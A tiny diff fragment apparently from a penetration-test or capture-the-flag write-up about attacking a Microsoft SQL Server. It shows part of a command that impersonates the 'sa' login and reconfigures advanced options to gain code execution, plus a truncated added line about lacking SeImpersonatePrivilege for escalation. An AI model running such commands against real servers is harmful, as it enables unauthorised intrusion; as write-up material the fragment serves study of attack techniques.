@@ -248,5 +248,5 @@ EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'show advanced options', 1; RECONFIGU
 
 I now have code execution
 
-
+However the user does not have SeImpersonatePrivile
 
